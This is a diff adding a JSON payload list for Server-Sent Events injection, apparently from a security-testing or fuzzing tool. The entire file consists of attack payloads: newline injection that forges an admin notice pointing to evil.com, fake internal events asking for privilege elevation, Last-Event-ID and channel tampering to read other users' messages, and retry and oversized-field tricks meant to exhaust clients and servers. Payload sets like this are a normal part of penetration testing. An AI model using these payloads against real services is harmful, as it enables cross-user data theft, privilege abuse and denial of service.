@@ -1,0 +1,30 @@
+{
+  "category": "sse_injection",
+  "contexts": {
+    "event_injection": {
+      "description": "Inject or manipulate Server-Sent Events stream fields",
+      "payloads": [
+        {"payload": "normal data\n\nevent: admin_notification\ndata: {\"message\": \"System update: visit http://evil.com/update\"}\n\n", "description": "Newline injection to split events — inject a fake admin notification event", "waf_bypass": false},
+        {"payload": "event: message\ndata: legit\n\nevent: __internal_command\ndata: {\"action\": \"elevate_privileges\", \"user\": \"attacker\"}\n\n", "description": "Inject custom event type that internal handlers may process without validation", "waf_bypass": false},
+        {"payload": "id: 99999999\ndata: injected\n\n", "description": "Set event ID to high value — on reconnect, client sends Last-Event-ID: 99999999, skipping real events", "waf_bypass": false},
+        {"payload": "retry: 1\ndata: flood\n\n", "description": "Set retry to 1ms — on disconnect, client hammers server with reconnections", "waf_bypass": false}
+      ]
+    },
+    "data_exfil_via_sse": {
+      "description": "Exploit SSE streams for data exfiltration or cross-user data access",
+      "payloads": [
+        {"payload": "data: {\"user_message\": \"normal\", \"debug_context\": \"__INCLUDE_SESSION_DATA__\"}\n\n", "description": "Inject data field that triggers server-side context inclusion in response stream", "waf_bypass": false},
+        {"payload": "channel=user_123&subscribe=true", "description": "Subscribe to another user's SSE channel by manipulating channel parameter", "waf_bypass": false},
+        {"payload": "Last-Event-ID: 0", "description": "Replay all events from stream beginning — may include other users' historical messages", "waf_bypass": false}
+      ]
+    },
+    "keepalive_abuse": {
+      "description": "Resource exhaustion and DoS via SSE stream manipulation",
+      "payloads": [
+        {"payload": ": comment spam\\n: comment spam\\n: comment spam\\n", "description": "SSE comment flood — colon-prefixed lines are comments that keep the connection alive and waste bandwidth", "waf_bypass": false},
+        {"payload": "retry: 0\ndata: disconnect\n\n", "description": "Set retry to 0 with immediate disconnect — client enters infinite reconnection loop", "waf_bypass": false},
+        {"payload": "data: AAAAAAAAAA[repeat 65536 times]\n\n", "description": "Oversized SSE data field to exhaust client memory or trigger buffer overflow", "waf_bypass": false}
+      ]
+    }
+  }
+}
